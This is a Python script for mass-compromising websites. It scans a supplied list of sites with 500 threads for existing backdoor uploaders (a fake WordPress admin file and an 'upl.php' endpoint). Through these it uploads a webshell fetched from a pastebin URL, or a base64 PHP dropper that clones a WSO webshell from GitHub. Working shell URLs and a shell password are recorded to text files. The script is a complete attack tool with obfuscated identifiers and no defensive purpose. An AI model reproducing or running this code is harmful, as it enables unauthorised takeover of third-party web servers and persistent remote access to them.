import requests
import os
from multiprocessing.dummy import Pool
import string
from random import choice, randint
from colorama import Fore
from colorama import Style
from colorama import init
import sys
requests.urllib3.disable_warnings()
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
def path_(i) :
	try :
		shell = 'http://'+i+'/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647'
		news = requests.get(shell, verify=False, headers=headers)
		if "<input type='submit' value='UPload File' />" in news.text or '<span>Upload file:' in news.text or 'type="submit" id="_upl" value="Upload">' in news.text :
			save_shell(shell)
		else :
			replace_http = shell.replace('http://','https://')
			recheck = requests.get(replace_http, verify=False, headers=headers)
			if "<input type='submit' value='UPload File' />" in recheck.text or '<span>Upload file:' in recheck.text or 'type="submit" id="_upl" value="Upload">' in recheck.text :
				save_shell(shell=replace_http)
			else :
				print(fr+'[  -No-  ]   >>>>> '+i)
	except :
		pass
def save_shell(shell) :
	try :
		__hfgysazer___nbvxw__khljm = string.ascii_uppercase
		______uytchdhjsqmd = randint(3,8)
		randoming = ''.join(choice(__hfgysazer___nbvxw__khljm) for i in range(______uytchdhjsqmd))
		_hhgyudd_iuopabbw__wxcqdseart = requests.get('https://pastebin.com/raw/YAFs3waV').text
		value____tytrtazewrsdytiyppng = 'utchiha-'+randoming+'.php'
		data = {'file': (value____tytrtazewrsdytiyppng,_hhgyudd_iuopabbw__wxcqdseart)}
		requests.post(shell, verify=False, files=data)
		requests.post(shell, verify=False, headers=headers, files=data)
		replace_name = shell.replace('x.php?action=768776e296b6f286f26796e2a72607e2972647',value____tytrtazewrsdytiyppng)
		possible = requests.get(replace_name, verify=False, headers=headers, timeout=10).text
		if "<span>Upload file:</span>" in possible:
			open('shells_uploaded.txt','a').write(replace_name+'\n')
		else :
			print('[failed ]>>>>   '+replace_name)
	except :
		pass
def ___________utchiha_____(i) :
    try :
        shell = 'http://'+i+'/upl.php'
        dataa = {'cmd': 'get_files'}
        check = requests.post(shell, verify=False,data=dataa, timeout=10)
        if '{"code":200,"' in check.text :
            print('Can_upload =====>>>  '+i)
            rce_utchiha(shell)
        else :
            change = shell.replace('http://','https://')
            again_check = requests.post(change, verify=False,data=dataa, timeout=10).text
            if '{"code":200,"' in again_check :
                print('ok ========>>>>>> '+i)
                rce_utchiha(shell=change)
            else :
                print('[ Fail ] =====>> '+i)
    except:
        pass
def rce_utchiha(shell) :
		os.system('curl -d "file=utchiha_uploader.php&data=PD9waHAKLy8gUmV0dXJuIHRoZSBsaXN0aW5nIG9mIHRoZSBkaXJlY3Rvcnkgd2hlcmUgdGhlIGZpbGUgcnVucyAoTGludXgpCnN5c3RlbSgiZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9tSWNIeUFtUmFOZS93c28td2Vic2hlbGwuZ2l0Iik7Cj8&cmd=upload" -X POST {0}'.format(shell))
		replacement = shell.replace('upl.php','utchiha_uploader.php')
		print(replacement)
		loading_and_uploading = requests.get(replacement, verify=False, timeout=10).text
		print(loading_and_uploading)
		replacement_again = replacement.replace('utchiha_uploader.php','wso.php')
		check = requests.get(replacement_again, verify=False, headers=headers, timeout=10).text
		if "placeholder='password' type=password" in  check :
			print('IS uploaded >>> '+replacement_again)
			open('shells.txt','a').write(replacement_again+'?password=ghost287'+'\n')
def run(i) :
	path_(i)
	___________utchiha_____(i)
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
def main() :
    utchiha = Pool(int(500))
    utchiha.map(run, target)
    utchiha.close()
    utchiha.join()
main()
